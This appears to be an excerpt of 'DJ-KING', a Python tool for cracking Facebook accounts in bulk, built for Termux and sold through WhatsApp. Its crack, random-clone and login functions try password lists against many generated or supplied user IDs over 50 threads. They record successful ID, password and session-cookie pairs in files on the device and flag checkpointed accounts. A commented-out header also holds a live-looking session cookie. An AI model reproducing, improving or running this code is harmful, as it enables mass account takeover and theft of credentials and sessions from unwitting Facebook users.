...
os.system("xdg-open https://www.facebook.com/profile.php?id=100000667784765/")
...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[Dj-KING')
...
$$$$$$$/         __   $$ |
                ...
                $$    $$/ 
                 $$$$$$/  
                   ...
                   
\033[1;91m---------------------------DJ-KING---------------------------
\033[1;91m[*] CREATOR   > DJ
\033[1;91m[*] FACEBOOK  > SABBIR ISLAM 
\033[1;91m[*] GITHUB    > SEX-XXX
\033[1;91m[*] VERSION   > FREE
\033[1;91m[*] WHATSAPP  > +88013********
\033[1;91m---------------------------DJ-KING---------------------------"""  )
...
def menu():
	os.system('clear')
	banner()
	_KING_(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')
	_KING_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')
	_KING_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')
	_KING_(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')
	_____KING_____ = input('\033[1;92m[\033[1;34djk™‚\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if _____KING_____ in ['1']:
		C1()
	if _____KING_____ in ['2']:
		Y2()
	if _____KING_____ in ['3']:
		BER()
	if _____KING_____ in ['4']:
		os.system("xdg-open https://www.facebook.com/profile.php?id=100000667784765")
	if _____KING_____ in ['0']:
		exit()
...
def passwrd():
	os.system('clear')
	banner()
	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(KING_NAME))
	...
	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;92m king OK : {h}%s '%(ok))
		
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{bo} [DJ] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m [\033[1;91mDJ-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				print(f'\r\x1b[1;92m [\033[1;92mDJ-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
				cek_apk(session,coki)
				open('/sdcard/DJ-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break
...
def Y2():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=50) as DJ:
        clear()
        tl = str(len(user))      
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mDj-KING\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
        	    cek_apk(session,coki)
        	    open('/sdcard/DJ-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	else:
        	    continue
        loop+=1
        sys.stdout.write('\r%s[Dj-KING]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
...
def KING(uid,pwv,tl):
    ...
    try:
        for ps in pwv:
            ...
            'cache-control': 'max-age=0',
            # 'cookie': 'datr=fhGOZAPbepoH5yGoC2hxyevI; sb=fhGOZKFqrEKFrOtZMWWxZJ1a; dnonce=AWkT79CV4lVlvEKTnYAPJe9gq71aqsJ8GJNkeQrPXPxgFlzYmsF2BMLOBd_Mzriu2QMMAck5lbI_vGYcL9mq8be7; fr=0f486pm7yI7OEuMZZ..BkjhF-.Z5.AAA.0.0.BklfJ-.AWXeTSzGTXw',
...
def mex():
    ...
    try:
        ...
        os.system('am start https://wa.me/+88013********?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20DJ%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
    r = requests.get('https://wa.me/+88013********/DJ/approved.txt/main/approved.%20txt').text
    if key1 in r:
